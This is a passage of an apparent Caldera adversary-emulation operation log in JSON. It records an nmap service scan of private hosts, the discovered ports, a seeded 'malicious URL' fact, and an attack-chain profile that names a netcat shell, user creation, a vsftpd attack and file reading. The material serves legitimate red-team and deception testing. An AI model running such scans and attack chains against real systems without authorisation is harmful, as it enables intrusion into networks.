"links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T22:26:05Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a26f2b0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a26d240>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:25:50Z", "command": "nmap -sV --version-light -oX - 192.168.201.1,2,91,3", "facts": [{"trait": "host.remote.ip", "links": ["2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.remote.ip192.168.201.91", "created": "2023-10-09T22:23:21Z", "relationships": ["host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T22:23:21Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.port_services", "links": ["2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:23:04Z", "relationships": ["host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.201.91) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:25:50Z"}], "name": "Enterprise Operation", "id": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "group": "", "jitter": "2/8", "source": {"adjustments": [], "rules": [{"match": ".*", "trait": "file.sensitive.extension", "action": "DENY"}, {"match": "png", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "yml", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "wav", "trait": "file.sensitive.extension", "action": "ALLOW"}], "name": "basic", "id": "ed32b9c3-9593-4c33-b0db-e2007315096b", "plugin": "stockpile", "facts": [{"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "wav", "unique": "file.sensitive.extensionwav", "created": "2023-10-09T22:19:01Z", "relationships": []}, {"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "yml", "unique": "file.sensitive.extensionyml", "created": "2023-10-09T22:19:01Z", "relationships": []}, {"trait": "file.sensitive.extension", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "png", "unique": "file.sensitive.extensionpng", "created": "2023-10-09T22:19:01Z", "relationships": []}, {"trait": "server.malicious.url", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "server.malicious.url", "technique_id": null, "origin_type": "SEEDED", "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "value": "keyloggedsite.com", "unique": "server.malicious.urlkeyloggedsite.com", "created": "2023-10-09T22:19:01Z", "relationships": []}], "relationships": []}, "obfuscator": "plain-text", "objective": {"percentage": 0.0, "goals": [{"achieved": false, "target": "exhaustion", "operator": "==", "value": "complete", "count": 1048576}], "name": "default", "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "description": "This is a default objective that runs forever."}, "visibility": 50, "adversary": {"atomic_ordering": ["deception-nmap", "deception-nmapsubnet", "deception-ssh", "deception-user-add", "deception-user-run-agent", "deception-ncshell", "deception-vsftpd", "deception-whoami", "deception-ls", "deception-pwd", "deception-readfile"], "name": "Deception Enterprise", "plugin": "deception", "description": "This is simple", "adversary_id": "deception_enterprise", "tags": [], "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "has_repeatable_abilities": false}}